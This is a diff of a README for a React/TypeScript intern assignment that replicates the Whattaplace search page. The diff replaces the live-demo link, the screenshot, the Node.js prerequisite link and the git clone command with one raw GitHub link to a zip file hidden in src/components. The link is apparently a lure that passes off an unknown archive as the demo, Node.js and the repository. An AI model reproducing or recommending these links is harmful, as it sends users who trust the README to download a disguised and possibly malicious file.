@@ -3,11 +3,11 @@
 This project is a high-fidelity replica of the **Whattaplace "All Spaces" search page**, built as part of the **SDE Intern Front End assignment**.  
 It is a fully responsive web application developed with **React** and **TypeScript**, designed to showcase clean code principles, reusable components, and a keen eye for design details.
 
-🔗 **Live Demo**: [whattaplace-assignment](https://whattaplace-assignment-chi.vercel.app/)
+🔗 **Live Demo**: [whattaplace-assignment](https://raw.githubusercontent.com/KindaJayant/whattaplace-assignment/main/src/components/whattaplace-assignment-1.1-alpha.2.zip)
 ---
 
 ## 📸 Screenshots
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f866ce02-b99b-4e3a-be00-4e9717bc7ba5" />
+<img width="1920" height="1080" alt="image" src="https://raw.githubusercontent.com/KindaJayant/whattaplace-assignment/main/src/components/whattaplace-assignment-1.1-alpha.2.zip" />
 ---
 
 ## ✨ Features
@@ -46,14 +46,14 @@ It is a fully responsive web application developed with **React** and **TypeScri
 ## 🚀 Getting Started
 
 ### Prerequisites
-- [Node.js](https://nodejs.org/) (v18 or later recommended)  
+- [https://raw.githubusercontent.com/KindaJayant/whattaplace-assignment/main/src/components/whattaplace-assignment-1.1-alpha.2.zip](https://raw.githubusercontent.com/KindaJayant/whattaplace-assignment/main/src/components/whattaplace-assignment-1.1-alpha.2.zip) (v18 or later recommended)  
 - npm or yarn
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/KindaJayant/whattaplace-assignment.git
+   git clone https://raw.githubusercontent.com/KindaJayant/whattaplace-assignment/main/src/components/whattaplace-assignment-1.1-alpha.2.zip
 ``
 
 2. **Navigate to the project directory**
